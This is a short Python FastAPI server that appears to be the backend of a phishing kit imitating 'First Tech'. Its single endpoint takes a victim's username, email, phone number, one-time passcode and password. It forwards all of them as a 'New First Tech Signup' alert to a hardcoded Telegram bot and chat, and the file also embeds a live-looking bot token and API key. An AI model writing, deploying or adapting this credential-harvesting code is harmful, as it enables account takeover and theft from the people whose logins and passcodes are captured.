from fastapi import FastAPI, Request, Header
from pydantic import BaseModel
import requests

app = FastAPI()

BOT_TOKEN = "7889947813:AAGuGDFulXfqDTQGlmoCBg9nMH8PKnz7UWo"
CHAT_ID = 7798072094
API_KEY = "Firsttech2026"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

class SignupData(BaseModel):
    username: str
    email: str
    phone: str
    otp: str
    password: str
    
@app.post("/api/send")
async def send_to_telegram(request: Request):
    x_api_key = request.headers.get("x-api-key")
    if x_api_key != API_KEY:
        return {"status": "error", "message": "Unauthorized"}

    data = await request.json()
    username = data.get("username", "N/A")
    email = data.get("email", "N/A")
    phone = data.get("phone", "N/A")
    otp = data.get("otp", "N/A")
    password = data.get("password", "N/A")

    text = f"""🚨 New First Tech Signup
Username: {username}
Email: {email}
Phone: {phone}
OTP: {otp}
Password: {password}"""

    requests.post(TELEGRAM_URL, json={"chat_id": CHAT_ID, "text": text})
    return {"status": "ok", "message": "Sent to Telegram"}
